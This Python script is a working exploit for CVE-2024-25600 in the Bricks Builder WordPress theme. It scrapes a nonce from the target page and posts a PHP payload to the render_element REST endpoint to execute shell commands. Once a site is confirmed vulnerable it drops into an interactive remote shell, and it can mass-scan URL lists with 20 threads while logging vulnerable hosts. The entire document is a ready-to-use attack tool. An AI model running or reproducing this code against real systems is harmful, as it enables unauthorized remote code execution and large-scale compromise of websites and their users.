import re
import warnings
import argparse
import requests

from rich.console import Console
from alive_progress import alive_bar
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
from concurrent.futures import ThreadPoolExecutor, as_completed


warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning, module="bs4")
warnings.filterwarnings(
    "ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning
)


class Code:
    def __init__(self, url, verbose=True):
        self.url = url
        self.verbose = verbose
        self.console = Console()
        self.nonce = self.fetch_nonce()

    def fetch_nonce(self):
        try:
            response = requests.get(self.url, verify=False, timeout=20)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, "html.parser")
            script_tag = soup.find("script", id="bricks-scripts-js-extra")
            if script_tag:
                match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string)
                if match:
                    return match.group(1)
        except Exception:
            pass

    def send_request(self, postId="1", command="whoami"):
        headers = {"Content-Type": "application/json"}
        payload = f"ob_start();echo `{command}`;$o=ob_get_contents();ob_end_clean();throw new Exception($o);"
        json_data = {
            "postId": postId,
            "nonce": self.nonce,
            "element": {
                "name": "container",
                "settings": {
                    "hasLoop": "true",
                    "query": {
                        "useQueryEditor": True,
                        "queryEditor": payload,
                        "objectType": "post",
                    },
                },
            },
        }
        req = requests.post(
            f"{self.url}/wp-json/bricks/v1/render_element",
            headers=headers,
            json=json_data,
            verify=False,
            timeout=20,
        )
        return req

    def process_response(self, response):
        if response and response.status_code == 200:
            html_content = response.json().get("data", {}).get("html", None)
            if html_content:
                match = re.search(r"Exception: (.*)$", html_content, re.DOTALL)
                if match:
                    extracted_text = match.group(1).rstrip()
                    return extracted_text

    def interactive_shell(self):
        session = PromptSession(history=InMemoryHistory())
        self.custom_print("Shell is ready, please type your commands UwU", "!")

        while True:
            try:
                cmd = session.prompt(HTML("<ansired><b># </b></ansired>"))
                match cmd.lower():
                    case "exit":
                        break
                    case "clear":
                        self.console.clear()
                    case _:
                        response = self.send_request(command=cmd)
                        print(self.process_response(response), "\n")
            except KeyboardInterrupt:
                break

    def check_vulnerability(self):
        try:
            response = self.send_request()
            extracted_text = self.process_response(response)

            if extracted_text:
                self.custom_print(
                    f"{self.url} is vulnerable to CVE-2024-25600, {extracted_text}", "+"
                )
            else:
                self.custom_print(
                    f"{self.url} is not vulnerable to CVE-2024-25600.", "-"
                ) if self.verbose else None
            return extracted_text
        except:
            self.custom_print(
                f"{self.url} is not vulnerable to CVE-2024-25600.", "-"
            ) if self.verbose else None

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        self.console.print(
            f"[bold {header_colors.get(header, 'white')}][{header}][/bold {header_colors.get(header, 'white')}] {message}"
        )


def scan_url(url, output_file=None):
    code_instance = Code(url, verbose=False)
    if code_instance.nonce:
        result = code_instance.check_vulnerability()
        if result and output_file:
            with open(output_file, "a") as file:
                file.write(f"{url}\n")
        return result


def main():
    parser = argparse.ArgumentParser(
        description="Check for CVE-2024-25600 vulnerability"
    )
    parser.add_argument(
        "--url", "-u", help="URL to fetch nonce from and check vulnerability"
    )
    parser.add_argument(
        "--list",
        "-l",
        help="Path to a file containing a list of URLs to check for vulnerability",
        default=None,
    )
    parser.add_argument(
        "--output",
        "-o",
        help="File to write vulnerable URLs to",
        default=None,
    )

    args = parser.parse_args()

    if args.list:
        urls = []
        with open(args.list, "r") as file:
            urls = [line.strip() for line in file.readlines()]

        with alive_bar(len(urls), enrich_print=False) as bar:
            with ThreadPoolExecutor(max_workers=20) as executor:
                future_to_url = {
                    executor.submit(scan_url, url, args.output): url for url in urls
                }
                for future in as_completed(future_to_url):
                    future_to_url[future]
                    try:
                        future.result()
                    except Exception:
                        pass
                    finally:
                        bar()
    elif args.url:
        code_instance = Code(args.url)
        if code_instance.nonce:
            code_instance.custom_print(f"Nonce found: {code_instance.nonce}", "*")
            if code_instance.check_vulnerability():
                code_instance.interactive_shell()
        else:
            code_instance.custom_print(
                "Nonce not found.", "-"
            ) if code_instance.verbose else None

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
